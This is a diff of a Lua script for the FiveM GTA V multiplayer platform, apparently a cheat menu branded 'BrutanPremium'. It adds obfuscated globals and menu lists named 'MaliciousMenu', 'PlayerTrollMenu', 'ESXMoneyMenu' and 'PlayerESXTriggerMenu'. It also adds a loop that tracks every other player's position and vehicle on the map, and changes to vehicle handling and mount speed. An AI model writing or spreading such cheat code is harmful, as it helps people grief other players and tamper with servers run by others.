@@ -1,299 +1,87 @@
+enabled = enabled
+KAKAAKAKAK = enabled
 
 
-VladmirAK47 = {}
-VladmirAK47.debug = false
-local active = false
-local active1 = false
-local smoke1 = false
-local bossmode = false
-local Shock = false
-local Shock99 = false
-local Ragdoll = false
-local Weed2 = false
-local drug2 = false
-local drug3 = false
-local drug4 = false
-local drug5 = false
-local drug6 = false
-local drug16 = false
-local drug17 = false
-local drug18 = false
-local drug19 = false
-local drug20 = false
-local drug21 = false
-local drug22 = false
-local drug23 = false
-local drug24 = false
-local drug25 = false
-local drug26 = false
-local drug27 = false
-local drug28 = false
-local drug29 = false
-local drug30 = false
-local AAA3 = false
-local Shock1 = false
-local Boggyman = false
-local Boggymanall = false
-local mysound = false
-local deathsound = false
-local forcefield = false
-local bird1 = false
-local test8 = false 
-local INV3 = false 
-local skin1 = false
-local sup = false
-local test007 = false
-local freeze2 = false
-local freezeV1 = false
-local TEST20 = false
-local TEST31 = false
-local TEST22 = false
-local TEST30 = false
-local pedControl = false 
-local manypeds = false
-local manypeds1 = false
-local clone = false
-local test4 = false
-local test991 = false
-local test992 = false
-local test993 = false
-local test994 = false
-local test995 = false
-local test996 = false
-local test997 = false
-local test2997 = false
-local test2096 = false
-local test2095 = false
-local test2998 = false
-local test2999 = false
-local test2990 = false
-local test3000 = false
-local test1997 = false
-local test4445 = false
-local test1998 = false
-local test998 = false
-local test999 = false
-local selectedPlayerId = nil
-local H4tuf5 = true
-local LMl35d = false
-local wtB2JF = "test"
----------------
+TriggerServerEvent = TriggerServerEvent
 
--------cONTROL
+
+GetHashKey = GetHashKey
+
+
+BrutanPremium = { } 
+BrutanPremium.debug = false
+
+jd366213 = false
+KZjx = jd366213
+ihrug = nil
+WADUI = ihrug
+
 local entityEnumerator = {
-  __gc = function(enum)
-    if enum.destructor and enum.handle then
-      enum.destructor(enum.handle)
-    end
-    enum.destructor = nil
-    enum.handle = nil
-  end
+	__gc = function(enum)
+		if enum.destructor and enum.handle then
+			enum.destructor(enum.handle)
+		end
+		enum.destructor = nil
+		enum.handle = nil
+	end
 }
+wdihwaduaw = true
+jejejejej = wdihwaduaw
+xjbvxyg3e = jejejejej
+waduyh487r64 = xjbvxyg3e
 
-local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
-  return coroutine.wrap(function()
-    local iter, id = initFunc()
-    if not id or id == 0 then
-      disposeFunc(iter)
-      return
-    end
-    
-    local enum = {handle = iter, destructor = disposeFunc}
-    setmetatable(enum, entityEnumerator)
-    
-    local next = true
-    repeat
-      coroutine.yield(id)
-      next, id = moveFunc(iter)
-    until not next
-    
-    enum.destructor, enum.handle = nil, nil
-    disposeFunc(iter)
-  end)
-end
 
-function EnumerateObjects()
-  return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
+function EnumerateEntities(initFunc, moveFunc, disposeFunc)
+	return coroutine.wrap(function()
+		local iter, id = initFunc()
+		if not id or id == 0 then
+			disposeFunc(iter)
+			return
+		end
+	
+		local enum = {handle = iter, destructor = disposeFunc}
+		setmetatable(enum, entityEnumerator)
+	
+		local next = true
+		repeat
+			coroutine.yield(id)
+			next, id = moveFunc(iter)
+		until not next
+	
+		enum.destructor, enum.handle = nil, nil
+		disposeFunc(iter)
+	end)
 end
 
 function EnumeratePeds()
-  return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
+    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
 end
 
-function EnumerateVehicles()
-  return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
+  function EnumerateVehicles()
+	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
+  end
+
+function GetAllPeds()
+    local peds123 = {}
+    for ped in EnumeratePeds() do
+        if DoesEntityExist(ped) then
+            table.insert(peds123, ped)
+        end
+    end
+    return peds123
 end
 
-function EnumeratePickups()
-  return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
-end
---------------
 
-local skateboard_car = nil
-local skateboard = nil
-local function EquipSkateboard()
-	Citizen.CreateThread(function()
-		local model = GetHashKey("p_defilied_ragdoll_01_s")
-		RequestModel(model)
-		while not HasModelLoaded(model) do
-			Citizen.Wait(0)
-		end
-		--GiveWeaponToPed(PlayerPedId(), GetHashKey("WEAPON_BAT"), 0, true, true)
 
-		skateboard = CreateObject(model, GetEntityCoords(PlayerPedId(), false), false, false, false)
-		local weapon_obj = GetWeaponObjectFromPed(PlayerPedId(), 1)
-		AttachEntityToEntity(skateboard, weapon_obj, 0, -0.05, 0.0, 0.3, 180.0, 90.0, 0.0, false, false, false, false, 2, true)
-		AttachEntityToEntity(weapon_obj, PlayerPedId(), GetPedBoneIndex(PlayerPedId(), 57005), 0.08, 0.0, 0.0, -85.0, 22.0, 0.0, false, false, false, false, 2, true)
-		SetPedCurrentWeaponVisible(PlayerPedId(), false, true, 0, 0)
-		SetPedCanSwitchWeapon(PlayerPedId(), false)
-	end)
-end
-
-local function UnequipSkateboard()
-	GiveWeaponToPed(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), 0, true, true)
-	DeleteObject(skateboard)
-	SetPedCanSwitchWeapon(PlayerPedId(), true)
-end
-
-local function StartSkating()
-	Citizen.CreateThread(function()
-		SetEntityAlpha(PlayerPedId(), 0)
-		RequestModel(1131912276)
-		while not HasModelLoaded(1131912276) do
-			Citizen.Wait(0)
-		end
-		skateboard_car = CreateVehicle(1131912276, GetEntityCoords(PlayerPedId(), false), GetEntityHeading(PlayerPedId()), true, false)
-		SetEntityInvincible(skateboard_car, true)
-		SetEntityAlpha(skateboard_car, 0)
-		local fakeskater = ClonePed(PlayerPedId(), GetEntityHeading(PlayerPedId()), false, true)
-		TaskPlayAnim(fakeskater, "move_strafe@stealth", "idle", 8.0, -4.0, -1, 9, 0.0, false, false, false)
-		AttachEntityToEntity(fakeskater,skateboard_car, 0, 0.0, 0.0, 0.75, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
-		SetEntityCollision(fakeskater, false, true)
-		SetBlockingOfNonTemporaryEvents(fakeskater, true)
-		SetEntityInvincible(fakeskater, true)
-		local model = GetHashKey("prop_railsleepers01")
-		RequestModel(model)
-		while not HasModelLoaded(model) do
-			Citizen.Wait(0)
-		end
-		skateboard = CreateObject(model, GetEntityCoords(PlayerPedId(), false), false, false, false)
-		AttachEntityToEntity(skateboard,skateboard_car, 0, 0.0, 0.0, -0.4, 0.0, 0.0, 190.0, false, false, false, false, 2, true)
-		SetPedIntoVehicle(PlayerPedId(), skateboard_car, -1)
-	end)
-end
-local function StartSkating1()
-	Citizen.CreateThread(function()
-		SetEntityAlpha(PlayerPedId(), 0)
-		RequestModel(1131912276)
-		while not HasModelLoaded(1131912276) do
-			Citizen.Wait(0)
-		end
-		skateboard_car = CreateVehicle(1131912276, GetEntityCoords(PlayerPedId(), false), GetEntityHeading(PlayerPedId()), true, false)
-		SetEntityInvincible(skateboard_car, true)
-		SetEntityAlpha(skateboard_car, 0)
-		local fakeskater = ClonePed(PlayerPedId(), GetEntityHeading(PlayerPedId()), false, true)
-		TaskPlayAnim(fakeskater, "move_strafe@stealth", "idle", 8.0, -4.0, -1, 9, 0.0, false, false, false)
-		AttachEntityToEntity(fakeskater,skateboard_car, 0, 0.0, 0.0, 0.75, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
-		SetEntityCollision(fakeskater, false, true)
-		SetBlockingOfNonTemporaryEvents(fakeskater, true)
-		SetEntityInvincible(fakeskater, true)
-		local model = GetHashKey("prop_minigun_01")
-		RequestModel(model)
-		while not HasModelLoaded(model) do
-			Citizen.Wait(0)
-		end
-		skateboard = CreateObject(model, GetEntityCoords(PlayerPedId(), false), false, false, false)
-		AttachEntityToEntity(skateboard,skateboard_car, 0, 0.0, 0.0, -0.4, 0.0, 0.0, 270.0, false, false, false, false, 2, true)
-		SetPedIntoVehicle(PlayerPedId(), skateboard_car, -1)
-	end)
-end
-local function StartSkating2()
-	Citizen.CreateThread(function()
-		TaskPlayAnim(PlayerPedId(), "move_strafe@stealth", "idle", 8.0, -4.0, -1, 9, 0.0, false, false, false)
-		local model = GetHashKey("prop_railsleepers01")
-		RequestModel(model)
-		Citizen.Wait(100)
-		if HasModelLoaded(model) then			
-		skateboard = CreateObject(model, GetEntityCoords(PlayerPedId(), false), false, false, false)
-		AttachEntityToEntity(skateboard, PlayerPedId(), 0, 0.0, 0.0, -1.0, 0.0, 0.0, 65.0, false, false, false, false, 2, true)
-		Noclip1 = true
-		drug27 = true
-		end
-		--SetPedIntoVehicle(PlayerPedId(), skateboard_car, -1)
-	end)
-end
-Citizen.CreateThread(function()
-	RequestAnimDict("move_strafe@stealth")
-	while true do
-		Citizen.Wait(0)
-		if IsControlJustPressed(0, 52) then
-        --drug27 = false
-        av('~h~~b~ Off.', false)
-		
-		end
-	end
-end)
-Citizen.CreateThread(function()
-	RequestAnimDict("move_strafe@stealth")
-	while true do
-		Citizen.Wait(0)
-		if IsControlJustPressed(0, 212) then	
-		UnequipSkateboard()
-        Noclip1 = false
-		FreezeEntityPosition(PlayerPedId(), false)
-        ClearPedTasksImmediately(PlayerPedId())
-        drug27 = false		
-		--AAA1 = false		
-		end
-	end
-end)
-SetPedCanSwitchWeapon(PlayerPedId(), true)
-RemoveAllPedWeapons(PlayerPedId(), 0)
-------
---sKY DIVE
-
-function IRON1()
-		
-		CreateThread(function()
-			local playerPed = PlayerPedId()
-			local playerPos = GetEntityCoords(playerPed)
-
-			GiveWeaponToPed(playerPed, GetHashKey('gadget_parachute'), 1, true, true)
-
-			DoScreenFadeOut(3000)
-
-			while not IsScreenFadedOut() do
-				Wait(0)
-			end
-
-			SetEntityCoords(playerPed, playerPos.x, playerPos.y, playerPos.z + 500.0)
-
-			DoScreenFadeIn(2000)
-
-			Wait(2000)
-
-			DisplayHelpText('Skyfall ~g~activated')
-
-			SetPlayerInvincible(playerPed, true)
-			SetEntityProofs(playerPed, true, true, true, true, true, false, 0, false)
-		
-			ApplyForceToEntity(playerPed, true, 0.0, 200.0, 2.5, 0.0, 0.0, 0.0, false, true, false, false, false, true)
-			Noclip1 = true
-		end)
-
-end
-
-------
-
------RIDE
+  
 local Deer = {
 	Handle = nil,
 	Invincible = false,
 	Ragdoll = false,
 	Marker = false,
 	Speed = {
-		Walk = 2.0,
-		Run = 3.0,
+		Walk = 3.0,
+		Run = 9.0,
 	},
 }
 
@@ -351,183 +139,14 @@ function Deer.Create()
 	local Ped = PlayerPedId()
 	local PedPosition = GetEntityCoords(Ped, false)
 
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
 
 	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
 	SetEntityInvincible(Deer.Handle, Deer.Invincible)
 
 	SetModelAsNoLongerNeeded(Model)
 end
-function Deer.Create11()
-	local Model = GetHashKey("futo")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
 
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
---local v = CreateObject(GetHashKey('prop_gascage01'), pos.x, pos.y, pos.z, true, true, true)
-	Deer.Handle = CreateObject(Model, PedPosition.x, PedPosition.y, PedPosition.z, true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create1()
-	local Model = GetHashKey("a_c_cow")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create2()
-	local Model = GetHashKey("A_C_Pig")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create3()
-	local Model = GetHashKey("A_C_Chimp")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create4()
-	local Model = GetHashKey("A_C_Chop")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create5()
-	local Model = GetHashKey("A_C_Cormorant")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create6()
-	local Model = GetHashKey("A_C_Coyote")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create7()
-	local Model = GetHashKey("A_C_Husky")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create8()
-	local Model = GetHashKey("A_C_MtLion")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
-function Deer.Create9()
-	local Model = GetHashKey("A_C_Rat")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
-
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
-
-	Deer.Handle = CreatePed(28, Model, PedPosition.x, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
-
-	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
-	SetEntityInvincible(Deer.Handle, Deer.Invincible)
-
-	SetModelAsNoLongerNeeded(Model)
-end
 function Deer.Attach()
 	local Ped = PlayerPedId()
 
@@ -544,6 +163,7 @@ function Deer.Attach()
 	FreezeEntityPosition(Deer.Handle, false)
 	FreezeEntityPosition(Ped, false)
 end
+
 function Deer.Ride()
 	local Ped = PlayerPedId()
 	local PedPosition = GetEntityCoords(Ped, false)
@@ -575,6 +195,7 @@ function Deer.Ride()
 		end
 	end
 end
+
 Citizen.CreateThread(function()
 	RequestAnimDict("rcmjosh2")
 	while not HasAnimDictLoaded("rcmjosh2") do
@@ -583,17 +204,7 @@ Citizen.CreateThread(function()
 	while true do
 		Citizen.Wait(0)
 
-		if IsControlJustPressed(1, 51) then
-			--Deer.Ride()
-		end
 
-		if IsControlJustPressed(1, 288) then
-			if not Deer.Handle then
-				--Deer.Create()
-			else
-				--Deer.Destroy()
-			end
-		end
 
 		local Ped = PlayerPedId()
 		local AttachedEntity = GetEntityAttachedTo(Ped)
@@ -601,12 +212,8 @@ Citizen.CreateThread(function()
 		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
 			if DoesEntityExist(Deer.Handle) then
 				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
-				local Speed, Range = Deer.Speed.Walk, 4.0
+				local Speed, Range = Deer.Speed.Walk, 4000.0
 
-				if IsControlPressed(0, 21) then
-					Speed = Deer.Speed.Run
-					Range = 8.0
-				end
 
 				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)
 
@@ -620,29 +227,801 @@ Citizen.CreateThread(function()
 		end
 	end
 end)
------
-function GetAllPeds()
-    local peds = {}
-    for ped in EnumeratePeds() do
-        if DoesEntityExist(ped) then
-            table.insert(peds, ped)
+
+
+
+local Enabled = true
+
+local states = {}
+states.frozen = false
+states.frozenPos = nil
+kkkk = "brutanpremium"
+local planeisbest = false
+local dEI = kkkk
+
+
+local ojtgh = "50.0"
+local a = 1
+
+local cg = true
+local ch = false
+local ci = true
+local chdata = {}
+	function mysplit(inputstr, sep)
+		if sep == nil then
+			sep = "%s"
+		end
+		local t={} ; i=1
+		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
+			t[i] = str
+			i = i + 1
+		end
+		return t
+	end
+
+	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
+                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
+                            "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
+                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
+                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
+                            "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu"}
+	
+local handlingData = {
+	"handlingName",
+	"fMass",
+	"fInitialDragCoeff",
+	"fPercentSubmerged",
+	"vecCentreOfMassOffset",
+	"vecInertiaMultiplier",
+	"fDriveBiasFront",
+	"nInitialDriveGears",
+	"fInitialDriveForce",
+	"fDriveInertia",
+	"fClutchChangeRateScaleUpShift",
+	"fClutchChangeRateScaleDownShift",
+	"fInitialDriveMaxFlatVel",
+	"fBrakeForce",
+	"fBrakeBiasFront",
+	"fHandBrakeForce",
+	"fSteeringLock",
+	"fTractionCurveMax",
+	"fTractionCurveMin",
+	"fTractionCurveLateral",
+	"fTractionSpringDeltaMax",
+	"fLowSpeedTractionLossMult",
+	"fCamberStiffnesss",
+	"fTractionBiasFront",
+	"fTractionLossMult",
+	"fSuspensionForce",
+	"fSuspensionCompDamp",
+	"fSuspensionReboundDamp",
+	"fSuspensionUpperLimit",
+	"fSuspensionLowerLimit",
+	"fSuspensionRaise",
+	"fSuspensionBiasFront",
+	"fTractionCurveMax",
+	"fAntiRollBarForce",
+	"fAntiRollBarBiasFront",
+	"fRollCentreHeightFront",
+	"fRollCentreHeightRear",
+	"fCollisionDamageMult",
+	"fWeaponDamageMult",
+	"fDeformationDamageMult",
+	"fEngineDamageMult",
+	"fPetrolTankVolume",
+	"fOilVolume",
+	"fSeatOffsetDistX",
+	"fSeatOffsetDistY",
+	"fSeatOffsetDistZ",
+	"nMonetaryValue",
+	"strModelFlags",
+	"strHandlingFlags",
+	"strDamageFlags",
+	"AIHandling",
+	
+	
+	"fThrust",
+	"fThrustFallOff",
+	"fThrustVectoring",
+	"fYawMult",
+	"fYawStabilise",
+	"fSideSlipMult",
+	"fRollMult",
+	"fRollStabilise",
+	"fPitchMult",
+	"fPitchStabilise",
+	"fFormLiftMult",
+	"fAttackLiftMult",
+	"fAttackDiveMult",
+	"fGearDownDragV",
+	"fGearDownLiftMult",
+	"fWindMult",
+	"fMoveRes",
+	"vecTurnRes",
+	"vecSpeedRes",
+	"fGearDoorFrontOpen",
+	"fGearDoorRearOpen",
+	"fGearDoorRearOpen2",
+	"fGearDoorRearMOpen",
+	"fTurublenceMagnitudeMax",
+	"fTurublenceForceMulti",
+	"fTurublenceRollTorqueMulti",
+	"fTurublencePitchTorqueMulti",
+	"fBodyDamageControlEffectMult",
+	"fInputSensitivityForDifficulty",
+	"fOnGroundYawBoostSpeedPeak",
+	"fOnGroundYawBoostSpeedCap",
+	"fEngineOffGlideMulti",
+	"handlingType",
+	"fThrustFallOff",
+	"fThrustFallOff",
+	
+	
+	"fBackEndPopUpCarImpulseMult",
+	"fBackEndPopUpBuildingImpulseMult",
+	"fBackEndPopUpMaxDeltaSpeed",
+	
+	
+
+	
+	"fLeanFwdCOMMult",
+	"fLeanFwdForceMult",
+	"fLeanBakCOMMult",
+	"fLeanBakForceMult",
+	"fMaxBankAngle",
+	"fFullAnimAngle",
+	"fDesLeanReturnFrac",
+	"fStickLeanMult",
+	"fBrakingStabilityMult",
+	"fInAirSteerMult",
+	"fWheelieBalancePoint",
+	"fStoppieBalancePoint",
+	"fWheelieSteerMult",
+	"fRearBalanceMult",
+	"fFrontBalanceMult",
+	"fBikeGroundSideFrictionMult",
+	"fBikeWheelGroundSideFrictionMult",
+	"fBikeOnStandLeanAngle",
+	"fBikeOnStandSteerAngle",
+	"fJumpForce",
+}
+
+
+
+Citizen.CreateThread(function()
+
+	function SetVehicleHandlingData(Vehicle,Data,Value) 
+		if DoesEntityExist(Vehicle) and Data and Value then
+			for theKey,property in pairs(handlingData) do 
+				if property == Data then
+					local intfind = string.find(property, "n" ) 
+					local floatfind = string.find(property, "f" )
+					local strfind = string.find(property, "str" )
+					local vecfind = string.find(property, "vec" )
+					
+					
+					if intfind ~= nil and intfind == 1 then
+						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
+					elseif floatfind ~= nil and floatfind == 1 then
+						local Value = tonumber(Value)+.0
+						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
+					elseif strfind ~= nil and strfind == 1 then
+						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
+					elseif vecfind ~= nil and vecfind == 1 then
+						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
+					else
+						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
+					end
+				end
+			end
+		end
+	end
+	
+	
+	function GetVehicleHandlingData(Vehicle,Data)
+		if DoesEntityExist(Vehicle) then
+			for theKey,property in pairs(handlingData) do 
+				if property == Data then
+					local intfind = string.find(property, "n" )
+					local floatfind = string.find(property, "f" )
+					local strfind = string.find(property, "str" )
+					local vecfind = string.find(property, "vec" )
+					
+					if intfind ~= nil and intfind == 1 then
+						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
+					elseif floatfind ~= nil and floatfind == 1 then
+						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
+					elseif vecfind ~= nil and vecfind == 1 then
+						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
+					else
+						return false
+					end
+				end
+			end
+		end
+	end
+	
+	function GetAllVehicleHandlingData(Vehicle)
+		local VehicleHandlingData = {}
+		if DoesEntityExist(Vehicle) then
+			for i,theData in pairs(handlingData) do 
+				local intfind = string.find(theData, "n" )
+				local floatfind = string.find(theData, "f" )
+				local strfind = string.find(theData, "str" )
+				local vecfind = string.find(theData, "vec" )
+				
+				if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
+				elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
+				elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
+					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
+				end
+			end
+			return VehicleHandlingData
+		end
+	end
+	
+		
+	
+	
+end
+)
+
+Citizen.CreateThread(function()
+	while true do
+		Citizen.Wait(10)
+		if(states.frozen)then
+			ClearPedTasksImmediately(GetPlayerPed(-1))
+			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
+		end
+	end
+end)
+
+Citizen.CreateThread(
+    function()
+        while true do
+            Wait(1)
+            for i = 0, 128 do
+                if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
+                   local ped = GetPlayerPed(i)
+                    blip = GetBlipFromEntity(ped)
+                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
+                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
+                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
+                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(i), false, false, '', false)
+                    wantedLvl = GetPlayerWantedLevel(i)
+                    if ch then
+                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
+                        if wantedLvl then
+                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
+                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
+                        else
+                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
+                        end
+                    else
+                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
+                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
+                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
+                    end
+                    if cg then
+                        if not DoesBlipExist(blip) then
+                            blip = AddBlipForEntity(ped)
+                            SetBlipSprite(blip, 1)
+                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
+                            SetBlipNameToPlayerName(blip, i)
+                        else
+                            veh = GetVehiclePedIsIn(ped, false)
+                            blipSprite = GetBlipSprite(blip)
+                            if not GetEntityHealth(ped) then
+                                if blipSprite ~= 274 then
+                                    SetBlipSprite(blip, 274)
+                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                    SetBlipNameToPlayerName(blip, i)
+                                end
+                            elseif veh then
+                                vehClass = GetVehicleClass(veh)
+                                vehModel = GetEntityModel(veh)
+                                if vehClass == 15 then
+                                    if blipSprite ~= 422 then
+                                        SetBlipSprite(blip, 422)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                        SetBlipNameToPlayerName(blip, i)
+                                    end
+                                elseif vehClass == 16 then
+                                    if
+                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
+                                            vehModel == GetHashKey('lazer')
+                                     then
+                                        if blipSprite ~= 424 then
+                                            SetBlipSprite(blip, 424)
+                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                            SetBlipNameToPlayerName(blip, i)
+                                        end
+                                    elseif blipSprite ~= 423 then
+                                        SetBlipSprite(blip, 423)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                    end
+                                elseif vehClass == 14 then
+                                    if blipSprite ~= 427 then
+                                        SetBlipSprite(blip, 427)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                    end
+                                elseif
+                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
+                                        vehModel == GetHashKey('limo2')
+                                 then
+                                    if blipSprite ~= 426 then
+                                        SetBlipSprite(blip, 426)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
+                                        SetBlipNameToPlayerName(blip, i)
+                                    end
+                                elseif vehModel == GetHashKey('rhino') then
+                                    if blipSprite ~= 421 then
+                                        SetBlipSprite(blip, 421)
+                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
